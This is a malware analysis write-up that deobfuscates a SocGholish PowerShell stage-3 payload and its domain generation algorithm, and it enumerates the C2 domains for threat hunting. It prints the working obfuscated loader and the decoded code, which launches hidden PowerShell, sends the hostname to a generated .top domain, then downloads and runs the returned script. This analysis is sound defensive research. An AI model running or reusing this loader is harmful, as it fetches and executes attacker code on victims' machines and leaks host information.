## SocGolish Domain Generation Algorithm (DGA)
### Date: 26/06/23
### Source: https://infosec.exchange/@rmceoin/110607716105280581
### Goal: Analysis of stage 3 payload 
### Language: Powershell
### File: f23.svg.zip
---
SocGholish C2 occasionally delivers a stage 2 JS payload that initiates downloading of the next stage from hxxp://wudugf[.]top/f23.svg.
This is a Domain Generation Algorithm (DGA) to download a Powershell beacon. The goal is to deofuscate the DGA and find domains used to download the beacon.

1) If we open the file `f23.svg` we see the definition of function `60qhutyid974vsx3pekc82zwfro`, which is used at the end of the script with a long base64 input:
```powershell
$ntrdiqguh9wos3a = [System.Text.Encoding]::ascii
function 60qhutyid974vsx3pekc82zwfro  {param($ie8qlc9o0bj7u53 )
  $1s35zfdj6ch4vpl = [System.Convert]::FromBase64String($ie8qlc9o0bj7u53)
  $1ho2u6td3nckxwi= $ntrdiqguh9wos3a.GetBytes("xpjhzswvqi3m")
    $xys32h7l60no85r = $1s35zfdj6ch4vpl
    $c3jvp2ab8uqez9x = $(for ($3va85li0gh67tdx = 0; $3va85li0gh67tdx -lt $xys32h7l60no85r.length; ) {
        for ($3lnqz2yeob6kvat = 0; $3lnqz2yeob6kvat -lt $1ho2u6td3nckxwi.length; $3lnqz2yeob6kvat++) {
            $xys32h7l60no85r[$3va85li0gh67tdx] -bxor $1ho2u6td3nckxwi[$3lnqz2yeob6kvat]
            $3va85li0gh67tdx++
            if ($3va85li0gh67tdx -ge $xys32h7l60no85r.Length) {
                $3lnqz2yeob6kvat = $1ho2u6td3nckxwi.length
            }
        }
    })
	$6s1ebt75hzgfawl = New-Object System.IO.MemoryStream( , $c3jvp2ab8uqez9x )

	    $jifctunw41lka9e = New-Object System.IO.MemoryStream
        $cjezyv9a3ibqn87 = New-Object System.IO.Compression.GzipStream $6s1ebt75hzgfawl, ([IO.Compression.CompressionMode]::Decompress)
	    $cjezyv9a3ibqn87.CopyTo( $jifctunw41lka9e )
        $cjezyv9a3ibqn87.Close()
		$6s1ebt75hzgfawl.Close()
		[byte[]] $f61rel4onawu583 = $jifctunw41lka9e.ToArray()
 $uvwd7rpzs24hmiq=$f61rel4onawu583
    return $uvwd7rpzs24hmiq
}

[System.Text.Encoding]::ascii.GetString((60qhutyid974vsx3pekc82zwfro "Z/tiaHpzd3Z1aZ45Mx/JWGrNILwO8XDJmtUOBRgt/ATavWgWoDM/LUNLszsZdfu3puKEAoUIHsLHIP7cCIleZLkPeEXI868C3em+uSvFYiF7516q3aobSVoRBd2R09IwvDSnfLJMfdCw2+lcwVJSYYVQ9Vu7RBFrmbxIO9n6IFTAciE2PI1U+oIbx/yaqjunkeZfjOJZ7WnDVB+NxteY2ASS4vCxefqKDvXb596Nfc5BVf+upNw2DMRbb/n5OxMtucIEnFCb2E3fymjLQeq32s30kFG/DStOgH5z6kq1RjOuixfiKYm2ogSA1GL20+iBN71BhiOSZVg6+OMt6j+/WD6DAIyKvo8WQZlAJ+FO831W6u7RSG587bUTV/QEYGhsSYV3qTQzYPKt+sGBbyo0cEzIkFFsiShNbN2gF6neH6E9lWvmzqpF6vvkKB8U/8gwjj0N0GUZ3C1Lr0BJifMJ+4yvEKD7Hdd56bIVZYEOWQmnWhTna/DmcE/rTIl5zgiFDBTqK1x0/q/3DyWZkc0iNBL1pcc4ragEP1XsLBjFO76W99JiuQHbWfcQOD2b2ivfTcUehtPm5XkbqJ04whFt5ioKiUF/eklgqRO3BKCd0AhidUWYHrPxoe/IqHfY8CnR+HVqaA=="))|iex;
```

 and later executed with the `Invoke-Expression`, `iex`.

2)A quick look shows that the function is only concatenating strings and decompressing them to generate a code. This code is executed in the last line.

3) We replace `iex ` for  `Write-Host ` to force the script to generate and print the next sript phase, and detonate it in our sandboxed machine (`f23.svg_safe.ps1`)

4) The output is as follows (`f23.svg_safe.ps1.out`):
```powershell
start-process powershell -args 'new-alias rzs $([char]105+[char]110+[char]118+[char]111+[char]107+[char]101+[char]45+[char]101+[char]120+[char]112+[char]114+[char]101+[char]115+[char]115+[char]105+[char]111+[char]110) ;$gan1p6s48m7k = New-Object ($([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]82+[char]97+[char]110+[char]100+[char]111+[char]109) )([int]((((Get-Date).DayOfYear+2) / 7) +2024)*2582);for ($prlmiwdkxnv0 = 0; $prlmiwdkxnv0 -lt 15; $prlmiwdkxnv0++) {$uq3wjxtc86nk += ($([char]97+[char]98+[char]99+[char]100+[char]101+[char]102+[char]103+[char]104+[char]105+[char]106+[char]107+[char]108+[char]109+[char]110) )[$gan1p6s48m7k.Next(0, 14)];}$global:block=(New-Object $([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]78+[char]101+[char]116+[char]46+[char]87+[char]101+[char]98+[char]67+[char]108+[char]105+[char]101+[char]110+[char]116) ).($([char]68+[char]111+[char]119+[char]110+[char]108+[char]111+[char]97+[char]100+[char]83+[char]116+[char]114+[char]105+[char]110+[char]103) )($([char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47) +$uq3wjxtc86nk+$([char]46+[char]116+[char]111+[char]112+[char]47+[char]53+[char]50+[char]51+[char]47+[char]115+[char]100+[char]102+[char]122+[char]119+[char]46+[char]112+[char]104+[char]112+[char]63+[char]105+[char]61) +$(hostname));rzs $global:block' -WindowStyle hidden
```

5) This ofuscated powershell will be executed by the `start-process powershell -args` in a hidden window as we can see by the footer  `-WindowStyle hidden`. 

6) If we remove the header and footer, and reformat the content we have the code:
```powershell
new-alias rzs $([char]105+[char]110+[char]118+[char]111+[char]107+[char]101+[char]45+[char]101+[char]120+[char]112+[char]114+[char]101+[char]115+[char]115+[char]105+[char]111+[char]110);
$gan1p6s48m7k = New-Object ($([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]82+[char]97+[char]110+[char]100+[char]111+[char]109) )([int]((((Get-Date).DayOfYear+2) / 7) +2024)*2582);
for ($prlmiwdkxnv0 = 0; $prlmiwdkxnv0 -lt 15; $prlmiwdkxnv0++) 
{
    $uq3wjxtc86nk += ($([char]97+[char]98+[char]99+[char]100+[char]101+[char]102+[char]103+[char]104+[char]105+[char]106+[char]107+[char]108+[char]109+[char]110) )[$gan1p6s48m7k.Next(0, 14)];
}
$global:block=(New-Object $([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]78+[char]101+[char]116+[char]46+[char]87+[char]101+[char]98+[char]67+[char]108+[char]105+[char]101+[char]110+[char]116) ).($([char]68+[char]111+[char]119+[char]110+[char]108+[char]111+[char]97+[char]100+[char]83+[char]116+[char]114+[char]105+[char]110+[char]103) )($([char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47) +$uq3wjxtc86nk+$([char]46+[char]116+[char]111+[char]112+[char]47+[char]53+[char]50+[char]51+[char]47+[char]115+[char]100+[char]102+[char]122+[char]119+[char]46+[char]112+[char]104+[char]112+[char]63+[char]105+[char]61) +$(hostname));
rzs $global:block
```

7) We can execute the individual lines to deofuscate the code. For instance:
If we execute  
`([char]105+[char]110+[char]118+[char]111+[char]107+[char]101+[char]45+[char]101+[char]120+[char]112+[char]114+[char]101+[char]115+[char]115+[char]105+[char]111+[char]110) ` 

we can see that the first line is equivalent to:

 `new-alias rzs invoke-expression `

8) If we execute the single $(*) snippets and rename some variables, we have the following cleaner code:
```powershell
new-alias rzs invoke-expression
$gan1p6s48m7k = New-Object (System.Random)([int]((((Get-Date).DayOfYear+2) / 7) +2024)*2582);
for ($i = 0; $i -lt 15; $i++) 
{
    $subdomain += (abcdefghijklmn )[$gan1p6s48m7k.Next(0, 14)];
}
$global:block=(New-Object System.Net.WebClient).(DownloadString)("http://" +$subdomain+ ".top/523/sdfzw.php?i=" +$(hostname));
rzs $global:block
```

Based on the day of the year, it will generate a domain in the .top and download a file sending the hostname of the system as a variable. The domain changes only every 7 days.

9) We can now generate all the domains used in the past, and future (`f23.svg_dga.ps1`) with the following code:
```powershell
for($j = 1; $j -lt 365; $j++)
{
    $gan1p6s48m7k = New-Object ("System.Random" )([int]((($j +2) / 7) +2024)*2582);
    $subdomain = ""

    for ($i = 0; $i -lt 15; $i++) 
    {
        $subdomain += ("abcdefghijklmn")[$gan1p6s48m7k.Next(0, 14)];

    }
    $domain = $subdomain+ ".top";
    Write-Host $j $domain (([datetime]"01/01/$((Get-Date).Year)").AddDays($j-1)).ToString("yyyy/MM/dd");
}
```

10) The list of all domains that can be generated is at 'all-domains.txt'. At the time of writing this, only this week's domain is active:
```
Name:	cmbefalcljjblia[.]top
Address: 143.244.162[.]145
```

11) Bonus: The beacon downloaded is in the file: `deediinlfifele_C2_beacon.ps1.zip`

